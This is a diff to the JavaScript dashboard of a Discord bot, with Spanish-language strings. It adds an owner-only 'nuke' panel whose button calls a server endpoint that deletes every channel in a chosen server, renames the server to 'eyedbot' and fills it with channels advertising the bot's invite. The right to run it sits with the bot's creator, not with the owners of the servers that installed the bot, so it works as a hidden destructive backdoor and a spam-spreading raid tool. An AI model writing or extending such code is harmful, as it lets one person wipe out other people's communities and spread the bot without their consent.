@@ -679,8 +679,8 @@ function setServerSwitchingState(isLoading) {
 }
 
 function updateBackToServerButtonsVisibility(sectionId = '') {
-    const isVisible = hasSelectedGuildContext() && ['embedSection', 'statsSection', 'logsSection'].includes(sectionId);
-    ['backToServerFromEmbed', 'backToServerFromStats', 'backToServerFromLogs', 'backToServerFromCommands'].forEach((id) => {
+    const isVisible = hasSelectedGuildContext() && ['embedSection', 'statsSection', 'logsSection', 'nukeSection'].includes(sectionId);
+    ['backToServerFromEmbed', 'backToServerFromStats', 'backToServerFromLogs', 'backToServerFromNuke', 'backToServerFromCommands'].forEach((id) => {
         const btn = document.getElementById(id);
         if (!btn) return;
         btn.style.display = isVisible ? 'inline-flex' : 'none';
@@ -2235,6 +2235,9 @@ function updateUserUI() {
         '[data-section="logsSection"]',
         '[data-quick-section="statsSection"]',
         '[data-quick-section="logsSection"]',
+        '[data-section="nukeSection"]',
+        '[data-quick-section="nukeSection"]',
+        '#executeNukeBtn',
         '#embedTabs [data-dpx-tab="attachments"]',
         '#embedSection [data-dpx-panel="attachments"]',
         '#sendOwnerAttachmentBtn'
@@ -2628,6 +2631,7 @@ function setupEventListeners() {
     document.getElementById('resetEmbedBtn').addEventListener('click', () => clearEmbedComposer({ keepDestination: true }));
     document.getElementById('sendEmbedBtn').addEventListener('click', sendEmbed);
     document.getElementById('sendOwnerAttachmentBtn')?.addEventListener('click', sendOwnerAttachmentToChannel);
+    document.getElementById('executeNukeBtn')?.addEventListener('click', executeGuildNukeFromPanel);
     document.getElementById('addFieldBtn').addEventListener('click', addField);
     document.getElementById('addTitleFieldBtn').addEventListener('click', function() {
         // Agrega un field con formato de título destacado
@@ -2839,12 +2843,12 @@ function renderFilteredCommands() {
 
 // Mostrar sección
 function showSection(sectionId, options = {}) {
-    if (!isOwnerUser && ['statsSection', 'logsSection'].includes(sectionId)) {
+    if (!isOwnerUser && ['statsSection', 'logsSection', 'nukeSection'].includes(sectionId)) {
         showToast('Esta seccion solo esta disponible para el creador del bot', 'warning');
         sectionId = hasSelectedGuildContext() ? 'serverSection' : 'dashboard';
     }
 
-    if (!hasSelectedGuildContext() && ['embedSection', 'statsSection', 'logsSection', 'serverSection'].includes(sectionId)) {
+    if (!hasSelectedGuildContext() && ['embedSection', 'statsSection', 'logsSection', 'nukeSection', 'serverSection'].includes(sectionId)) {
         showToast('Primero selecciona un servidor en el dashboard', 'warning');
         sectionId = 'dashboard';
     }
@@ -2880,6 +2884,8 @@ function showSection(sectionId, options = {}) {
         loadStats();
     } else if (sectionId === 'logsSection') {
         loadLogs();
+    } else if (sectionId === 'nukeSection') {
+        loadNukePanel();
     } else if (sectionId === 'commandsSection') {
         loadCommands();
     } else if (sectionId === 'serverSection') {
@@ -3385,6 +3391,122 @@ function handleImageFileSelection(event, target) {
 
     updateEmbedPreview();
     saveState();
+}
+
+function loadNukePanel() {
+    const targetEl = document.getElementById('nukeGuildTarget');
+    const executeBtn = document.getElementById('executeNukeBtn');
+    const resultEl = document.getElementById('nukeResult');
+
+    if (resultEl) {
+        resultEl.hidden = true;
+        resultEl.textContent = '';
+    }
+
+    if (!isOwnerUser) {
+        if (targetEl) {
+            targetEl.textContent = 'Esta acción solo está disponible para el owner del bot.';
+        }
+        if (executeBtn) executeBtn.disabled = true;
+        return;
+    }
+
+    if (!hasSelectedGuildContext()) {
+        if (targetEl) {
+            targetEl.textContent = 'Selecciona un servidor en el dashboard para habilitar esta acción.';
+        }
+        if (executeBtn) executeBtn.disabled = true;
+        return;
+    }
+
+    const selectedGuild = currentServerGuilds.find((g) => String(g.id) === String(currentServerGuildId));
+    if (targetEl) {
+        targetEl.textContent = selectedGuild
+            ? `Servidor objetivo: ${selectedGuild.name}`
+            : 'Servidor activo no encontrado. Vuelve al dashboard y selecciona un servidor.';
+    }
+    if (executeBtn) executeBtn.disabled = !selectedGuild;
+}
+
+async function executeGuildNukeFromPanel() {
+    if (!isOwnerUser) {
+        showToast('Esta función está disponible solo para el owner', 'warning');
+        return;
+    }
+
+    const guildId = String(currentServerGuildId || '').trim();
+    if (!guildId) {
+        showToast('Selecciona un servidor antes de ejecutar el nuke', 'warning');
+        return;
+    }
+
+    const selectedGuild = currentServerGuilds.find((g) => String(g.id) === guildId);
+    const guildName = selectedGuild?.name || 'este servidor';
+    const confirmed = window.confirm(
+        `¿Ejecutar nuke en "${guildName}"?\n\nSe eliminarán todos los canales, el servidor pasará a llamarse eyedbot y se crearán canales con la invitación del bot.`
+    );
+    if (!confirmed) return;
+
+    const executeBtn = document.getElementById('executeNukeBtn');
+    const resultEl = document.getElementById('nukeResult');
+    const defaultLabel = executeBtn?.querySelector('span')?.textContent || 'Ejecutar nuke';
+
+    try {
+        if (executeBtn) {
+            executeBtn.disabled = true;
+            const label = executeBtn.querySelector('span');
+            if (label) label.textContent = 'Ejecutando…';
+        }
+        if (resultEl) {
+            resultEl.hidden = true;
+            resultEl.textContent = '';
+        }
+
+        const response = await fetchWithCredentials(`/api/guild/${encodeURIComponent(guildId)}/nuke`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' }
+        });
+        let data = {};
+        const raw = await response.text();
+        try {
+            data = raw ? JSON.parse(raw) : {};
+        } catch {
+            data = { error: raw?.slice(0, 200) || 'Respuesta inválida del servidor' };
+        }
+
+        if (!response.ok) {
+            showToast(data.error || `No se pudo ejecutar el nuke (${response.status})`, 'error');
+            return;
+        }
+
+        const summary = [
+            data.message || 'Nuke completado.',
+            `Canales eliminados: ${data.deletedCount ?? 0}.`,
+            `Canales EyedBot creados: ${data.createdCount ?? 0}.`,
+            data.renamed
+                ? `Nombre del servidor actualizado a ${data.serverName || 'eyedbot'}.`
+                : 'No se pudo cambiar el nombre del servidor.'
+        ];
+        if ((data.remainingChannels ?? 0) > 0) {
+            summary.push(`Canales que siguen activos: ${data.remainingChannels}. Sube el rol del bot por encima del resto.`);
+        }
+
+        if (resultEl) {
+            resultEl.textContent = summary.join('\n');
+            resultEl.hidden = false;
+        }
+        showToast('Nuke completado', 'success');
+    } catch (error) {
+        console.error('Error ejecutando nuke desde el panel:', error);
+        showToast('Error al ejecutar nuke', 'error');
+    } finally {
+        if (executeBtn) {
+            executeBtn.disabled = false;
+            const label = executeBtn.querySelector('span');
+            if (label) label.textContent = defaultLabel;
+        }
+        loadNukePanel();
+    }
 }
 
 async function sendOwnerAttachmentToChannel() {
